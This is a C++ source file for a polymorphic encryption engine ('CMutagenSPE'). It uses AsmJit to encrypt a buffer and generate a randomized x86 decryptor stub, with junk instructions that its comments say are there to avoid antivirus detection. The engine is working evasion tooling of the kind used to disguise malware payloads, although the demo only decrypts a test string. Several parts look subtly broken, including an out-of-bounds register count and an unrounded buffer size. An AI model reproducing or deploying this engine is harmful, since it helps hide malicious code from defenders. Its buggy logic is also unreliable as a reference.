#include "includes.hpp"
#include "bagheera.hpp"

using namespace asmjit;
using namespace asmjit::x86;


/**
 * Sets the registers to be used in the polymorphic phase. The election is done at random.
 */
void CMutagenSPE::RandomizeRegisters()
{
  Gp cRegsGeneral[] =  {regs::eax, regs::ecx, regs::ebx, regs::edx, regs::esi, regs::edi};

  std::random_shuffle(&cRegsGeneral[0], &cRegsGeneral[6]);  // shuffle the order to randomize register election

  regSrc = cRegsGeneral[0];  // will contain pointer to encryted data
  regDst = cRegsGeneral[1];  // will contain pointer to output buffer (function parameter)
  regSize = cRegsGeneral[2];  // will contain size of encrypted data buffer
  regKey = cRegsGeneral[3];  // will contain decryption key
  regData = cRegsGeneral[4];  // will contain data that is been operated by the decryption function

  // set the register whose values will be preserved across function invocations
  //Gp cRegsSafe[] = {regs::eax, regs::ecx, regs::ebx, regs::edx, regs::esi, regs::edi};
  //std::random_shuffle(&cRegsSafe[0], &cRegsSafe[6]); // shuffle the order to randomize register election

  regSafe1 = regs::esi;  //cRegsSafe[0];
  regSafe2 = regs::edi;  //cRegsSafe[1];
  regSafe3 = regs::ebx;  //cRegsSafe[2];
}


/**
 * Generate decryption function prologue.
 */
void CMutagenSPE::GeneratePrologue(x86::Assembler& a)
{

  // save original value of EBP is saved so it can be used to refer to the stack frame. two equivalent options
  if (rand()%2 == 0) {
    a.push(ebp);
    a.mov(ebp, esp);    

  } else {
    a.enter(imm(0), imm(0));
  }

  // save sensitive registers. if using stdcall convention, these regs are: ESI, EDI, or EBX
  a.push(regSafe1);
  a.push(regSafe2);
  a.push(regSafe3);

  // load the pointer to the output buffer
  a.mov(regDst, dword_ptr(regs::ebp, 0x08 + (4 * 0)));
}


/**
 * Generate code to obtain pointer to encryptd data which is appended at the end of the function.
 */
void CMutagenSPE::GenerateDeltaOffset(x86::Assembler& a)
{
  
  lblDeltaOffset = a.newLabel();  // create the delta_offset label
  a.call(lblDeltaOffset);  // generate 'call delta_offset'
  size_t posUnusedCodeStart = a.offset(); // Get the current offset

  // random code addition to avoid antivirus detection
  if (rand()%2 == 0)
    a.mov(regs::eax, imm(1));
  else
    a.xor_(regs::eax, regs::eax);

  a.leave();
  a.ret(1 * sizeof(unsigned long));

  dwUnusedCodeSize = static_cast<unsigned long>(a.offset() - posUnusedCodeStart); // calculate size of the unused code
  a.bind(lblDeltaOffset);  // bind the label here
  posDeltaOffset = a.offset();

  // read the stack and get value
  a.mov(regSrc, dword_ptr(regs::esp));
  a.add(regs::esp, imm(sizeof(unsigned long)));

  // generate instruction which will be updated later with offset size
  a.long_().add(regSrc, imm(987654321));

  // save position of code for later reference
  posSrcPtr = a.offset() - sizeof(unsigned long);
}


/**
 * Generate the encryption keys, encryption instructions, and finally encrypt the input data
 */
void CMutagenSPE::EncryptInputBuffer( unsigned char * lpInputBuffer, unsigned long dwInputBuffer, 
                                      unsigned long dwMinInstr, unsigned long dwMaxInstr )
{
  // generate encryption key
  dwEncryptionKey = (unsigned long) rand();  

  // round up the size of the input buffer
  unsigned long dwAlignedSize __attribute__ ((aligned)) = dwInputBuffer; 
  
  // number of blocks to encrypt
  dwEncryptedBlocks = dwAlignedSize / sizeof(unsigned long); 

  // cast input buffer pointer from char to long
  unsigned long * lpdwInputBuffer = reinterpret_cast<unsigned long *>(lpInputBuffer);

  // allocate memory for the output data (rounded to block size)
  posix_memalign((void **)&diEncryptedData, BLOCK_SIZE, dwAlignedSize);

  // cast input buffer pointer from char to long
  unsigned long * lpdwOutputBuffer = reinterpret_cast<unsigned long *>(diEncryptedData);

  // randomly select the number of encryption instructions
  dwCryptOpsCount = dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr);

  // allocate memory for an array which will record information about the sequence of encryption instructions
  posix_memalign((void **)&diCryptOps, BLOCK_SIZE, dwCryptOpsCount * sizeof(SPE_CRYPT_OP));


  // set up a direct pointer to this table in a helper variable
  lpcoCryptOps = reinterpret_cast<P_SPE_CRYPT_OP>(diCryptOps);

  // generate encryption instructions and their type
  for (unsigned long i = 0; i < dwCryptOpsCount; i++)
  {
    lpcoCryptOps[i].bCryptWithReg = rand()%2;  // select if instruction performs oepration combining regData and regKey
    lpcoCryptOps[i].regDst = regData;  // register being operated

    // if regKey is not used, create random one-use key or save regKey
    if (lpcoCryptOps[i].bCryptWithReg == FALSE)
      lpcoCryptOps[i].dwCryptValue = (unsigned long) rand();
    else
      lpcoCryptOps[i].regSrc = regKey;

    // randomly choose the type of encryption instruction
    lpcoCryptOps[i].cCryptOp = static_cast<unsigned char>(dwMinInstr + rand() % (( dwMaxInstr + 1 ) - dwMinInstr));
  }

  // encrypt the input data according to instructions just generated
  for (unsigned long i = 0, dwInitialEncryptionKey = dwEncryptionKey; i < dwEncryptedBlocks; i++)
  {
    // take the next block for encryption
    unsigned long dwInputBlock = lpdwInputBuffer[i];

    // encryption loop: executes the sequence of encryption instructions on the data block
    for (unsigned long j = 0, dwCurrentEncryptionKey; j < dwCryptOpsCount; j++)
    {
      if (lpcoCryptOps[j].bCryptWithReg == FALSE)
        dwCurrentEncryptionKey = lpcoCryptOps[j].dwCryptValue;
      else
        dwCurrentEncryptionKey = dwInitialEncryptionKey;

      // depending on the encryption operation, perform the appropriate modification of the data block
      switch(lpcoCryptOps[j].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        dwInputBlock += dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_SUB:
        dwInputBlock -= dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_XOR:
        dwInputBlock ^= dwCurrentEncryptionKey;
        break;
      case SPE_CRYPT_OP_NOT:
        dwInputBlock = ~dwInputBlock;
        break;
      case SPE_CRYPT_OP_NEG:
        dwInputBlock = 0L - dwInputBlock;
        break;
      }
    }

    // store the encrypted block in the buffer
    lpdwOutputBuffer[i] = dwInputBlock;
  }
}


/**
 * Set up the keys which will be used to decrypt the data in the apropiate registers
 */
void CMutagenSPE::SetupDecryptionKeys(x86::Assembler& a)
{
  
  unsigned long dwKeyModifier = (unsigned long) rand();

  switch(rand()%3)
  {
  case 0:
    a.mov(regKey, imm(dwEncryptionKey - dwKeyModifier));
    a.add(regKey, imm(dwKeyModifier));
    break;
  case 1:
    a.mov(regKey, imm(dwEncryptionKey + dwKeyModifier));
    a.sub(regKey, imm(dwKeyModifier));
    break;
  case 2:
    a.mov(regKey, imm(dwEncryptionKey ^ dwKeyModifier));
    a.xor_(regKey, imm(dwKeyModifier));
    break;
  }
}


/**
 *  generate the decryption code (for the main decryption loop)
 */
void CMutagenSPE::GenerateDecryption(x86::Assembler& a)
{
  // set up the size of the encrypted data (in blocks)
  a.mov(regSize, imm(dwEncryptedBlocks));

  // create a label for the start of the decryption loop
  Label lblDecryptionLoop = a.newLabel();
  a.bind(lblDecryptionLoop);

  // read the data referred to by the regSrc register
  a.mov(regData, dword_ptr(regSrc));

  // build the decryption code by generating each decryption instruction in reverse
  for (int i = dwCryptOpsCount - 1; i != -1; i--)
  {
    if (lpcoCryptOps[i].bCryptWithReg == FALSE)
    {
      unsigned long dwDecryptionKey = lpcoCryptOps[i].dwCryptValue;

      switch(lpcoCryptOps[i].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        a.sub(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_SUB:
        a.add(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_XOR:
        a.xor_(lpcoCryptOps[i].regDst, imm(dwDecryptionKey));
        break;
      case SPE_CRYPT_OP_NOT:
        a.not_(lpcoCryptOps[i].regDst);
        break;
      case SPE_CRYPT_OP_NEG:
        a.neg(lpcoCryptOps[i].regDst);
        break;
      }
    }
    else
    {
      switch(lpcoCryptOps[i].cCryptOp)
      {
      case SPE_CRYPT_OP_ADD:
        a.sub(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_SUB:
        a.add(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_XOR:
        a.xor_(lpcoCryptOps[i].regDst, lpcoCryptOps[i].regSrc);
        break;
      case SPE_CRYPT_OP_NOT:
        a.not_(lpcoCryptOps[i].regDst);
        break;
      case SPE_CRYPT_OP_NEG:
        a.neg(lpcoCryptOps[i].regDst);
        break;
      }
    }
  }

  // write the decrypted block to the output buffer
  a.mov(dword_ptr(regDst), regData);

  // update the pointers to the input and ouput buffers to point to the next block
  a.add(regSrc, imm(sizeof(unsigned long)));
  a.add(regDst, imm(sizeof(unsigned long)));

  // decrement the loop counter (the number of blocks remaining to decrypt)
  a.dec(regSize);

  // check if the loop is finished if not, jump to the start
  a.jne(lblDecryptionLoop);
}


///////////////////////////////////////////////////////////
//
// set up output registers, including the function return value
//
///////////////////////////////////////////////////////////

void CMutagenSPE::SetupOutputRegisters(SPE_OUTPUT_REGS *regOutput, unsigned long dwCount, x86::Assembler& a)
{
  // if there are no output registers to set up, return
  if ((regOutput == NULL) || (dwCount == 0))
    return;

  // shuffle the order in which the registers will be set up
  std::random_shuffle(&regOutput[0], &regOutput[dwCount]);

  // generate instructions to set up the output registers
  for (unsigned long i = 0; i < dwCount; i++)
    a.mov(regOutput[i].regDst, imm(regOutput[i].dwValue));
}


///////////////////////////////////////////////////////////
//
// generate epilogue of the decryption function
//
///////////////////////////////////////////////////////////

void CMutagenSPE::GenerateEpilogue(unsigned long dwParamCount, x86::Assembler& a)
{
  // restore the original values of registers ESI EDI EBX
  a.pop(regSafe3);
  a.pop(regSafe2);
  a.pop(regSafe1);

  // restore the value of EBP
  if (rand()%2 == 0)
  {
    a.leave();
  }
  else
  {
    a.mov(regs::esp,regs::ebp);
    a.pop(regs::ebp);
  }

  // return to the code which called our function; additionally adjust the stack by the size of the passed
  // parameters (by stdcall convention)
  a.ret(imm(dwParamCount * sizeof(unsigned long)));
}


/**
 * align the size of the decryption function to the specified granularity
 */
void CMutagenSPE::AlignDecryptorBody(unsigned long dwAlignment, x86::Assembler& a, CodeHolder& code)
{
  a.align(kAlignCode, dwAlignment);
}


/**
 * correct all instructions making use of addressing relative to the delta offset
 * reference: https://asmjit.com/doc/classasmjit_1_1x86_1_1Assembler.html  section: Using x86::Assembler as Code-Patcher
 */
void CMutagenSPE::UpdateDeltaOffsetAddressing(x86::Assembler& a)
{
  // Get current position
  size_t current_position = a.offset(); 
  
  // Calculate the offset to the encrypted data
  unsigned long dwAdjustSize = static_cast<unsigned long>(current_position - posDeltaOffset); 
  
  // Go to place where reference to encrypted data is made
  a.setOffset(posSrcPtr); 

  // Update the instruction with proper direction
  a.long_().add(regSrc, dwAdjustSize + dwUnusedCodeSize);

  // Return to position we where in previous to the patch
  a.setOffset(current_position); 
}


/**
 * append the encrypted data to the end of the code of the decryption function
 */
void CMutagenSPE::AppendEncryptedData(x86::Assembler& a)
{
  unsigned long * lpdwEncryptedData = reinterpret_cast<unsigned long *>(diEncryptedData);

  // place the encrypted data buffer at the end of the decryption function (in 4-unsigned char blocks)
  for (unsigned long i = 0; i < dwEncryptedBlocks; i++)
    a.dq(lpdwEncryptedData[i]);
}


void CMutagenSPE::WriteToFile(unsigned char *lpcDecryptionProc, unsigned long dwDecryptionProcSize)
{
  std::string filename = "bins/not_gonna_harm_your_pc_";
  //std::string filenum = std::to_string(rand()%10);
  //std::string extension = ".BenIgN";
  filename += std::to_string(rand()%10);
  filename += ".BenIgN";

  FILE *hFile = fopen(filename.c_str(), "wb");

  if (hFile != NULL)
  {
    fwrite(lpcDecryptionProc, dwDecryptionProcSize, 1, hFile);
    fclose(hFile);
  }


}

///////////////////////////////////////////////////////////
//
// main function - encrypts data and generates polymorphic
//                 decryptor code
//
///////////////////////////////////////////////////////////

int CMutagenSPE::PolySPE( unsigned char * lpInputBuffer, unsigned long dwInputBuffer, unsigned char * *lpOutputBuffer, \
                          unsigned long * lpdwOutputSize )
{
  DEBUG("calling main function");
  
  // check input errors
  if ( (lpInputBuffer == NULL) || (dwInputBuffer == 0) ||  (lpOutputBuffer == NULL) || (lpdwOutputSize == NULL) )
    return MUTAGEN_ERR_PARAMS;
  
  JitRuntime rt;                // Create a runtime specialized for JIT
  CodeHolder code;              // Create a CodeHolder
  code.init(rt.environment());  // Initialize code to match the JIT environment
  Assembler a(&code);           // Create and attach x86::Assembler to code
  code.setLogger(&logger);      // Attach the `logger` to `code` holder
  logger.setFile(stdout);       // Set the standard output as the logger exit
  
  DEBUG("randomly select registers");
  RandomizeRegisters();

  DEBUG("generate function prologue");
  GeneratePrologue(a);

  DEBUG("set up relative addressing through the delta offset technique");
  GenerateDeltaOffset(a);

  // encrypt the input data, generate encryption keys. the additional parameters set the lower and upper limits on the 
  // number of encryption instructions which will be generated (there is no limit to this number, you can specify 
  // numbers in the thousands, but be aware that this will make the output code quite large)
  DEBUG("encrypt the input data");
  EncryptInputBuffer(lpInputBuffer, dwInputBuffer, 3, 5);

  DEBUG("generate code to set up keys for decryption");
  SetupDecryptionKeys(a);

  DEBUG("generate decryption code");
  GenerateDecryption(a);

  DEBUG("set up the values of the output registers");
  SPE_OUTPUT_REGS regOutput[] = { { regs::eax, dwInputBuffer } };
  SetupOutputRegisters(regOutput, 2, a);

  DEBUG("generate function epilogue");
  GenerateEpilogue(1L, a);

  DEBUG("align the size of the function to a multiple of 4 or 16");
  AlignDecryptorBody(rand()%2 == 0 ? 4L : 16L, a, code);

  DEBUG("fix up any instructions that use delta offset addressing");
  UpdateDeltaOffsetAddressing(a);

  DEBUG("place the encrypted data at the end of the function");
  AppendEncryptedData(a);


  // free the encrypted data buffer
  //free(&diEncryptedData);

  // free the array of encryption pseudoinstructions
  //free(&diCryptOps);

  ///////////////////////////////////////////////////////////
  //
  // copy the polymorphic code to the output buffer
  //
  ///////////////////////////////////////////////////////////

  unsigned long dwOutputSize = code.codeSize();
  

  // assemble the code of the polymorphic function (this resolves jumps and labels)
  DecryptionProc lpPolymorphicCode;
  Error err = rt.add(&lpPolymorphicCode, &code);
  if (err) return 1;                // Handle a possible error returned by AsmJit.

  // this struct describes the allocated memory block
  char *diOutput;

  // allocate memory (with execute permissions) for the output buffer
  posix_memalign((void **)&diOutput, BLOCK_SIZE, dwOutputSize);

  // check that allocation was successful
  if (diOutput != NULL)
  {
    // copy the generated code of the decryption function
    memcpy(diOutput, (void *)lpPolymorphicCode, dwOutputSize);

    // provide the output buffer and code size to
    // this function's caller
    *lpOutputBuffer = (unsigned char *)diOutput;
    *lpdwOutputSize = dwOutputSize;

    WriteToFile(*lpOutputBuffer, dwOutputSize);

    char *szOutputBuffer;
    szOutputBuffer = (char *) malloc(32);

    // call the decryption function via its
    // function pointer
    unsigned int dwOutputSize = lpPolymorphicCode(szOutputBuffer);

    // display the decrypted text - if everything
    // went correctly this will show "Hello world!"
    std::cout << "Results:\n";
    std::cout << "returned size: " << dwOutputSize << "\n";
    
    rt.release(lpPolymorphicCode);
  }
  else
  {
    rt.release(lpPolymorphicCode);

    return MUTAGEN_ERR_MEMORY;
  }

  ///////////////////////////////////////////////////////////
  //
  // function exit
  //
  ///////////////////////////////////////////////////////////

  return MUTAGEN_ERR_SUCCESS;
}

